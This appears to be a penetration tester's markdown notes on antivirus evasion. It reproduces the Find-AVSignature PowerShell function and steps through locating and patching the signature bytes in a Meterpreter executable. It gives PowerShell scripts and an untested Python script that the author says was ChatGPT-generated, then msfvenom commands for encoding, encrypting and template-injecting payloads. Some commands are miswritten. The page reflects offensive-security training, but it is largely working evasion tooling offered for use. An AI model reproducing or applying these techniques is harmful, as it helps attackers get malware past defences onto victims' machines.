# AV software
* [ClamAV](https://www.clamav.net/)
* [Avira](https://www.avira.com/)
* TrendMicro
* McAfee
* Kaspersky
* ...

# Locating Signatures in Files
<details>
  <summary>Expand</summary>
Free AV products: ClamAV, Avira

We must determine the exact bytes that are triggering detection. For this we cut the binary into smaller pieces and scan them.
For this we use a PowerShell function [Find-AVSignature](http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html):

```powershell
function Find-AVSignature {
<#
.SYNOPSIS

    Find-AVSignature

    Locates single Byte AV signatures utilizing the same method as DSplit from "class101" on heapoverflow.com

    Authors: Chris Campbell (@obscuresec) & Matt Graeber (@mattifestation)
    License: BSD 3-Clause

.DESCRIPTION

    A script to locate tiny AV signatures.

.PARAMETER Startbyte

    Specifies the first byte to begin splitting on.

.PARAMETER Endbyte

    Specifies the last byte to split on.

.PARAMETER Interval

    Specifies the interval size to split with.

.PARAMETER Path

    Specifies the path to the binary you want tested.

.PARAMETER OutPath

    Optionally specifies the directory to write the binaries to.
    
.PARAMETER Force

    Forces the script to continue without confirmation.    

.EXAMPLE

    PS C:\> Find-AVSignature -Startbyte 0 -Endbyte max -Interval 10000 -Path c:\test\exempt\nc.exe 
    PS C:\> Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run2 -Verbose
    PS C:\> Find-AVSignature -StartByte 16000 -EndByte 17000 -Interval 100 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run3 -Verbose
    PS C:\> Find-AVSignature -StartByte 16800 -EndByte 16900 -Interval 10 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run4 -Verbose
    PS C:\> Find-AVSignature -StartByte 16890 -EndByte 16900 -Interval 1 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run5 -Verbose

.NOTES

    Several of the versions of "DSplit.exe" available on the internet contain malware.

.LINK

    http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html
    https://github.com/mattifestation/PowerSploit
    http://www.exploit-monday.com/
    http://heapoverflow.com/f0rums/project.php?issueid=34&filter=changes&page=2
#>

[CmdletBinding()] Param(
        [Parameter(Mandatory = $True)] [Int32] $StartByte,
        [Parameter(Mandatory = $True)] [String] $EndByte,
        [Parameter(Mandatory = $True)] [Int32] $Interval,
        [Parameter(Mandatory = $False)] [String] $Path = ($pwd.path),
        [Parameter(Mandatory = $False)] [String] $OutPath = ($pwd),
        [Switch] $Force = $False
    )

    #test variables
    if (!(Test-Path $Path)) {Throw "File path not found"}
    $Response = $True
    if (!(Test-Path $OutPath)) {}
        if ( $Force -or ( $Response = $psCmdlet.ShouldContinue("The `"$OutPath`" does not exist! Do you want to create the directory?",""))){new-item ($OutPath)-type directory}
    if (!$Response) {Throw "Output path not found"}
    if (!(Get-ChildItem $Path).Exists) {Throw "File not found"}
    [Int32] $FileSize = (Get-ChildItem $Path).Length
    if ($StartByte -gt ($FileSize - 1) -or $StartByte -lt 0) {Throw "StartByte range must be between 0 and $Filesize"}
    [Int32] $MaximumByte = (($FileSize) - 1)
    if ($EndByte -ceq "max") {$EndByte = $MaximumByte}
    if ($EndByte -gt $FileSize -or $EndByte -lt 0) {Throw "EndByte range must be between 0 and $Filesize"}

    #read in byte array
    [Byte[]] $FileByteArray = [System.IO.File]::ReadAllBytes($Path)

    #find the filename for the output name
    [String] $FileName = (Split-Path $Path -leaf).Split('.')[0]

    #Calculate the number of binaries
    [Int32] $ResultNumber = [Math]::Floor(($EndByte - $StartByte) / $Interval)
    if (((($EndByte - $StartByte) % $Interval)) -gt 0) {$ResultNumber = ($ResultNumber + 1)}
    
    #Prompt user to verify parameters to avoid writing binaries to the wrong directory
    $Response = $True
    if ( $Force -or ( $Response = $psCmdlet.ShouldContinue("This script will result in $ResultNumber binaries being written to `"$OutPath`"!",
             "Do you want to continue?"))){}
    if (!$Response) {Return}
    
    Write-Verbose "This script will now write $ResultNumber binaries to `"$OutPath`"." 
    [Int32] $Number = [Math]::Floor($Endbyte/$Interval)
        
        #write out the calculated number of binaries
        [Int32] $i = 0
        for ($i -eq 0; $i -lt $ResultNumber; $i++)
        {
            [Int32] $SplitByte = (($StartByte) + (($Interval) * ($i)))
            Write-Verbose "Byte 0 -> $($SplitByte)"
            [IO.File]::WriteAllBytes((Join-Path $OutPath "$($FileName)_$($SplitByte).bin"), $FileByteArray[0..($SplitByte)])
        }
        
        #Write out the final binary
        [IO.File]::WriteAllBytes((Join-Path $OutPath "$($FileName)_$($EndByte).bin"), $FileByteArray[0..($EndByte)])
        Write-Verbose "Byte 0 -> $($EndByte)"
        Write-Verbose "Files written to disk. Flushing memory."
        
        #During testing using large binaries, memory usage was excessive so lets fix that
        [System.GC]::Collect()
        Write-Verbose "Completed!"
}

```


First import it:

```powershell
Import-Module .\Find-AVSignature.ps1

```

The Interval parameter is used to specify the size of each individual segment of the file. This value is dependent on the size of the executable.
We will set each segment to 10000 bytes.

```
Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
```

Next run AV Scan against created folder avtest1
Let's assume the segment from 0 to 10000 is ok and the following are flagged as malicious.
Next adjust start and end bytes as well as the interval (getting smaller)

```powershell
Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force
```
Repeat the step until you find the exact byte that triggers AV.
Set this byte to 0 with the following scripts:


PowerShell:
```powershell
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```
Python (not tested, generated with ChatGPT):
```python
source_path = r"C:\Tools\met.exe"
destination_path = r"C:\Tools\met_mod.exe"

# Read all bytes from the source file
with open(source_path, "rb") as f:
    bytes = bytearray(f.read())

# Modify the byte at index 18867 to 0
bytes[18867] = 0

# Write the modified bytes to the destination file
with open(destination_path, "wb") as f:
    f.write(bytes)

print("File modification complete.")

```
Repeat the last step to verify that AV does not detect the segment anymore.
Afterwards, take the modified binary and repeat all over to check if there are other bytes that trigger AV.
After finding all bytes to evade detection, the file is still detected by AV. We can evade this by changing the last byte at offset 73801.
Changing it to 0x00 does not produce a clean scan, but changing it to 0xFF does. 

```powershell
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
$bytes[18987] = 0
$bytes[73801] = 0xFF
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

</details>


# Metasploit Encoders and Encryptors

```
metasploit --list encoders
sudo msfvenomm -p ... -e x86/shikata_ga_nai -f exe -o met.exe
sudo msfvenomm -p ... -e x86/shikata_ga_nai -x notepad.exe -f exe -o met.exe

metasploit --list encrypt
sudo msfvenom -p ... --encrypt aes256 --encrypt-key asdfasdfasdf -f exe -o met.exe
```

Likely still detected since the decoding and decrypting routines are static and known by vendors.

